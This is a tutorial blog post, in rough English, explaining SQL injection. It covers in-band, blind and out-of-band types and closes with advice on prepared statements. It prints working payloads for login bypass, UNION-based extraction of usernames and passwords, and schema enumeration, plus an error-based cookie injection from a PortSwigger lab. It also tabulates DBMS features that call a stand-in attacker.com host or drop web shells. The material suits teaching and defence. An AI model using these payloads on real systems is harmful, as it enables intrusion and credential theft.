# SQL injection

# 1. Abstract

This post detail about vulnerabilities server side is SQL injection. In my post, i will explain about root case of it, how to work it, common type of vulnerability, payload for purpose exploit it and recommendations.

---

# 2. Introduction

SQL injection is vulnerability appear at query with database. Here, attacker can exploit sensitive information or create, delete database or table,… This vulnerability impact with confidence and integrity of data. This my scope in post research is explain about rootcase of  vulnerability, list common type of it, recommendations for vulnerability.

---

# 3. Where appear vulnerability SQL injection?

SQL Injection vulnerabilities typically occur **in locations where SQL queries are constructed using user input**.
At these points, if the input is **not properly validated or sanitized**, an attacker can **manipulate the query structure**.

---

## 4. How write Queries SQL in PHP

Web applications often need to **interact with a database** to store or retrieve information. This interaction is handled through **SQL queries**. Some of the most commonly used SQL statement include:

- `SELECT` – retrieves data from a database
- `INSERT INTO` – adds new records
- `UPDATE` – modifies existing records
- `DELETE` – removes records
- `CREATE TABLE` – creates a new table
- `DROP TABLE` – deletes a table

Here is a simple example of a `SELECT` query written in PHP:

```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$query = $database->query($sql);
$row = $query->fetch_assoc();
```

In this example:

- The query attempts to **select all columns** from the `users` table.
- It uses a `WHERE` clause to match the `username` and `password` provided by the user.
- The input values (`$username` and `$password`) are directly embedded into the query string — which is a potential security risk.
- The query is executed by the database, and the result (typically one matching row) is returned to the backend application.

If the provided username and password match a record in the database, the user is considered authenticated.

⚠️ **However, directly inserting user input into SQL queries (as shown above) is dangerous. Malicious input can alter the intended logic of the query, leading to vulnerabilities such as SQL Injection.**

---

# 5. How to SQLi work

SQL Injection works by **injecting malicious input** into a SQL query in such a way that the logic of the original query is altered. This happens when user input is directly concatenated into the query string without proper validation or sanitization.

```php
SELECT * FROM users WHERE username = 'admin'' AND password = '$password'

```

Suppose an attacker enters the following input:

```php
$username = admin' --
$password = anything

```

The resulting SQL query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'

```

In SQL, `--` begins a comment, so everything after it is ignored. Therefore, the query becomes:

```php
SELECT * FROM users WHERE username = 'admin'

```

This allows the attacker to log in as the user **admin** without providing a valid password.

### Why this happens?

In this case, the attacker **closes the string prematurely** with `'`, and injects SQL syntax to bypass the intended logic. The original query expected a condition like:

```sql
username = 'something' AND password = 'something'

```

But the attacker manipulates it so the `AND password = ...` part is removed.

SQL Injection allows attackers to:

- Bypass authentication
- Access or modify unauthorized data
- Execute administrative operations (like `DROP`, `UPDATE`, `INSERT`)
- Exfiltrate data (in blind/time-based injections)

---

# 6. How to extend statement

In SQL have many method extend command as:

- Logical manipulation: `AND`, `OR`, `NOT`
- UNION-based injection
- Comment injection: , `#`
- Stacked queries: `; DROP TABLE ...`
- Subqueries and nested SELECT
- Time-based blind SQLi
- Error-based SQLi
- Out-of-band SQLi
- Hex/char obfuscation
- Second-order SQLi

---

# 7. Types of SQL injection

## In-band SQLI:

This is SQL injection with progress attack and received result in like channel. Example if attacker using web browser for attack then result will return this web browser. In brand SQLi include two type:

1. **error-based SQL injection**
2. **union-based SQL injection**

## **Blind SQLi:**

This is type of SQL injection but we don’t have information about data of database return to web browser but we can understand it by signature as Boolean TRUE/FAlSE or Time deplay.  In Blind SQLi include two type:

1. **Boolean-based Blind SQLi**
2. **Time-Base Blind SQLi**

## **Out-of-band SQLi**

This type don’t common in SQLi. This vulnerability appear when attack don’t attack and take result in one channel. So, attacker will transfer data to difference channel. but this method depend of config of DBMS. if config of DBMS don’t support for transfer data then this method don’t perform

---

# 8. Explain case of In-band SQLi

## **Union-based SQL injection**

The scope of Union based SQLi is using statement UNION in SQL with purpose change response result. But we have a problem is we need know number column of original query then we can execute statement don’t appear error.  Example:

```sql
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['id'])) {
    $id = $_POST['id'];
    $sql = "SELECT id, title, content, author, comment FROM blogs WHERE id = $id";
    $result = $conn->query($sql);
}

```

I have query select data from blogs have vulnerability SQLi. with query i will exploit UNION based SQLi by use to statement UNION extend to query extract data from users.

![image.png](image.png)

Payload:

```sql
1 UNION SELECT NULL,NULL,NULL,username,password FROM users WHERE username = 'admin' --
```

Now, We will explain about payload. In query is **SELECT id, title, content, author, comment FROM blogs WHERE id =** 1. But with payload we will extend query and extract data from table users. But we don’t understand users have many column and we just need username and password so we can’t using NULL is data for column don’t use. After we combine UNION with original query. Oh, we have question!. Why i know table users and name columns username and password?. That right!, we can’t define it by using extract data from metadata of SQL.

### Extract data from metadata of DBMS

In Mysql, We can extract metadata from information_schema. information schema is aggregate system table provide meta include:

- List table
- List column
- data type
- constraints
- index
- privileges
- schemas

By using select metadata we can know information about table, column. I have example extract metadata from mydemo.

1. We will demo progress extract table_names from database by take data from meta. Payload:
    
    ```sql
     1 UNION SELECT NULL,NULL,table_name,NULL,NULL
     FROM information_schema.tables WHERE table_schema = database()--
    
    ```
    
2. After have information about table next to we will extract name of column in table users by using select metadata column. Because one table can have many column so we can using statement CONCAT() combine many name column in strings. example:
    
    ```sql
    1 UNION SELECT NULL,NULL,CONCAT(column_name,' '),NULL,NULL
    FROM information_schema.columns WHERE table_name = 'users'--
    
    ```
    

Exploit metadata is important step when exploit UNION based SQLi. Because UNION based SQLi is in band exploit and we don’t understand table, column name so we need define it.

## **Error-based SQL injection**

This method of SQL Injection exploitation relies on **error messages** returned by the server, which can reveal valuable information about the **structure of SQL queries** or even **leak sensitive data** directly through verbose error outputs.

While error messages are an essential feature for developers during application development and debugging, they can also introduce vulnerabilities if not properly handled. Detailed error responses often include information such as:

- Name of the database object (e.g., table or column)
- The location or line of the error
- The structure or logic of the SQL query
- The exact command or value that caused the failure

Such information helps attackers **identify the presence of a SQL injection flaw** and may allow them to **reconstruct or manipulate the query structure**, or even extract data directly from the error itself.

This type of vulnerability can typically be exploited using two main techniques:

1. **Blind SQL Injection via Conditional Errors**
    
    Triggering specific errors based on boolean logic to infer true/false responses — explained further in the "Blind SQLi" section.
    
2. **Extracting Sensitive Data from Verbose SQL Errors**
    
    Leveraging detailed error messages (commonly seen in PostgreSQL or MSSQL) to directly extract database values or schema information.
    

**Extracting Sensitive Data via Error Messages:**

Attackers can often gain valuable information by observing full SQL queries or server responses. When error messages reveal data returned from a query, this becomes a serious vulnerability that can be exploited. One common technique for extracting sensitive data involves using the `CAST()` function to trigger type conversion errors.

This vulnerability typically affects **PostgreSQL** and **Microsoft SQL Server (MSSQL)**. In these systems, if an invalid type conversion is attempted—such as casting a string to an integer—an error message is returned that may include the problematic data, which can sometimes reveal sensitive information.

For example:

```jsx
-- PostgreSQL
SELECT CAST('admin' AS int);
-- Error:
ERROR: invalid input syntax for type integer: "admin"
LINE 1: SELECT CAST('admin' AS int);

-- MSSQL
SELECT CAST('admin' AS int);
-- Error:
Msg 245, Level 16, State 1, Server <server>, Line <line>
Conversion failed when converting the varchar value 'admin' to data type int.

```

These detailed error messages are often enabled by **default configurations** in PostgreSQL and MSSQL. However, depending on the server setup, error verbosity might vary.

In contrast, **MySQL** and **Oracle Database** do not typically expose such vulnerabilities in their default configurations. For example, in MySQL, an invalid cast usually returns `0` without including sensitive details. Similarly, Oracle returns a general error when casting from a character to a numeric type, without revealing the original value.

```jsx
MySQL:
SELECT CAST('ADMIN' AS UNSIGNED);
-- Result:
+----------------------------+
| CAST('ADMIN' AS UNSIGNED) |
+----------------------------+
|                          0 |
+----------------------------+
--------------------------------------------------------
Oracle Database:
SELECT CAST('ADMIN' AS UNSIGNED) FROM dual;
-- Error:
ERROR at line 1:
ORA-00902: invalid datatype

```

After explain we will test with lab in portswigger:

[https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

Request:

```jsx
GET /filter?category=Gift
Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--;
```

Response:

```jsx
ERROR: invalid input syntax for type integer: "administrator"
```

---

## **Boolean-based Blind SQLi**

Blind SQLi occurs when application have SQL injection but application don’t display data from database of detail error message. In case, we can determine application have vulnerability by analyst trigger condition HTTP response or create signature determine vulnerability by time delays.

**Triggering Conditional Responses in HTTP:**

Now let’s examine a lab from PortSwigger:

In this lab, the web page uses a `TrackingId` cookie to track user behavior. If the `TrackingId` is valid, the server responds with a "Welcome back" message; otherwise, it returns nothing.

The vulnerability lies in how the server processes the `TrackingId`. By injecting a malicious payload into this cookie, we can modify the query to test individual characters of the administrator's password. Each payload forms a boolean expression that evaluates to true or false based on the result. If the condition is true, the response includes the “Welcome back” message—otherwise, it does not. By observing these responses, we can infer each character of the password one by one and eventually reconstruct the entire password.

![image.png](image%201.png)

**Triggering Conditional Errors:**

This technique is similar to conditional-based attacks, where the HTTP response does not include a signature when an error occurs. However, by deliberately causing an error and observing whether it happens or not, we can derive a boolean condition that reveals information based on the server’s response behavior.

![image.png](image%202.png)

**Triggering time delays:**

This technique is similar to two technique condition based and condition error, where the HTTP response does not include a signature and don’t have error page when error then we will self signature TRUE/FALSE by using time delay. When condition TRUE then will delay some time and opposite condition FALSE then don’t delay.

![image.png](image%203.png)

### **Out-of-band SQL injection**

This technique exploit SQLi when application don’t response In-Band include signature on web page, error page, or detect we create signature by method use to time delay. In technique, we will create signature by using danger feature of DBMS with purpose send HTTP to OUT-Band, location control by attacker. 

![image.png](image%204.png)

In DBMS include many feature allow DBMS send DNS or request HTTP to Out-band. This Feature can profit by attacker for purpose exploit SQLi Out-Band. We can list in DBMS include:

### **1. Microsoft SQL Server (MSSQL)**

| Function / Feature | Description |
| --- | --- |
| `xp_cmdshell` | Executes system commands like `nslookup`, `powershell`, `curl` |
| `xp_dirtree` | Accesses UNC paths → sends a DNS request to `\\attacker.com\share` |
| `openrowset()` | Connects to external servers via OLEDB |
| `sp_oacreate` | Invokes COM objects → can send HTTP requests or create files |

### **2. PostgreSQL**

| Function / Statement | Description |
| --- | --- |
| `COPY TO PROGRAM` | Writes query output to the result of a system command (like `curl`) |
| `lo_export()` | Exports LOB content to a file → can be combined to drop web shells |
| `dblink_connect()` | Connects to another PostgreSQL server over TCP |
| `COPY FROM PROGRAM` | (PostgreSQL 12+) Reads input from a system command |

### **3. Oracle Database**

| PL/SQL Package | Description |
| --- | --- |
| `UTL_HTTP.REQUEST(url)` | Sends an HTTP request to the specified URL |
| `HTTPURITYPE.getCLOB()` | Fetches content from HTTP and stores it in a variable |
| `UTL_INADDR.GET_HOST_ADDRESS()` | May trigger a DNS lookup |
| `DBMS_LDAP.INIT()` | Sends an LDAP query → can be abused for DNS exfiltration |

### **4. MySQL / MariaDB**

| Feature | Description |
| --- | --- |
| `LOAD_FILE('\\attacker.com\abc')` | Sends a DNS request to a UNC path |
| `INTO OUTFILE '/var/www/html/shell.php'` | Writes a shell to the web directory |
| `sys_exec()` (MariaDB) | Executes system commands (if plugin is enabled) |

In features, some is enable default some can enable by administrator.

| **DBMS** | **Dangerous Feature** | **Enabled by Default?** | **Security Notes** |
| --- | --- | --- | --- |
| **MSSQL** | `xp_cmdshell` | ❌ **DISABLED** | Must be manually enabled via `sp_configure` |
|  | `xp_dirtree` | ✅ **ENABLED** | Sends DNS via UNC path, usually not blocked |
|  | `openrowset()` | ✅ **ENABLED** | May be blocked depending on configuration |
|  | `sp_oacreate` | ❌ **DISABLED** | Requires COM automation to be enabled |
| **PostgreSQL** | `COPY TO PROGRAM` | ❌ **DISABLED** | Enabled only if `superuser` and `config_allow_copy_program = on` |
|  | `lo_export`, `lo_import` | ✅ **ENABLED** | Requires elevated privileges |
|  | `dblink` | ❌ **DISABLED** | Requires installing the `dblink` extension |
| **Oracle** | `UTL_HTTP` | ✅ **ENABLED** (with limits) | Available by default but requires `EXECUTE` privilege |
|  | `HTTPURITYPE` | ✅ **ENABLED** | Often blocked by outbound firewall |
|  | `DBMS_LDAP` | ✅ **ENABLED** | Requires specific privileges and configuration |
| **MySQL** | `LOAD_FILE()` | ✅ **ENABLED** | As long as file is in accessible filesystem; UNC paths may trigger DNS |
|  | `INTO OUTFILE` | ✅ **ENABLED** | Requires write permissions; can be used to drop web shells |
| **MariaDB** | `sys_exec()` / `sys_eval()` | ❌ **DISABLED** | Requires enabling `sql_shell` or `userstat` plugin |

---

# 9. Prevent SQL injection

This vulnerability SQLi then root cause is developer allow user can direct input to query and we can insert payload to query after forward to DBMS execute. Result is we change structure of query and purpose of them. Prevent this vulnerability we can use technique call Prepare statement in write query of backend. 

### How to Prepare statement work?

Prepare statement work by it will build structure of query before count value to query.

Example in PHP:

```php
// prepare statement
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username); // "s" = string

// const value
$username = 'admin';
$stmt->execute();
```

Don’t using prepare statement:

![image.png](image%205.png)

Using prepare statement:

![image.png](image%206.png)

---

# 10. Cheetsheet

### [**https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/**](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)

### [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

# 11. Preference

1. [https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli](https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli)
2. [https://www.acunetix.com/websitesecurity/sql-injection2/#:~:text=Error-based SQLi is an,to enumerate an entire database](https://www.acunetix.com/websitesecurity/sql-injection2/#:~:text=Error%2Dbased%20SQLi%20is%20an,to%20enumerate%20an%20entire%20database).
3. [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

# ______________________**Thank you**_____________________